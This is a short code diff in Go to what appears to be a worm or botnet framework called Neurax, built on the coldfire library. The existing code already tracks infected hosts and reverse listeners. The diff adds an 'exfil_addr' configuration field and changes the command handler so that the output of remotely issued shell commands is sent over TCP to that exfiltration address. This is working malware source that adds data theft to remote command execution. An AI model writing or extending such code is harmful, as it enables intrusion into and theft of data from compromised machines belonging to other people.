@@ -48,6 +48,7 @@ type __NeuraxConfig struct {
 	scan_interval    string
 	reverse_listener string
 	prevent_reexec   bool
+	exfil_addr       string
 }
 
 var NeuraxConfig = __NeuraxConfig{
@@ -72,6 +73,7 @@ var NeuraxConfig = __NeuraxConfig{
 	scan_interval:    "2m",
 	reverse_listener: "none",
 	prevent_reexec:   true,
+	exfil_addr:       "none",
 }
 
 func ReportError(message string, e error) {
@@ -229,7 +231,16 @@ func handle_command(cmd string) {
 			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
 		}
 		if strings.Contains(preamble, "x") {
-			coldfire.CmdOut(cmd)
+			out, err := coldfire.CmdOut(cmd)
+			if err != nil {
+				out += ": " + err.Error()
+			}
+			if strings.Contains(preamble, "v") {
+				host := strings.Split(NeuraxConfig.exfil_addr, ":")[0]
+				port := strings.Split(NeuraxConfig.exfil_addr, ":")[1]
+				p, _ := strconv.Atoi(port)
+				coldfire.SendDataTCP(host, p, out)
+			}
 		}
 		if strings.Contains(preamble, "a") {
 			for _, host := range InfectedHosts {
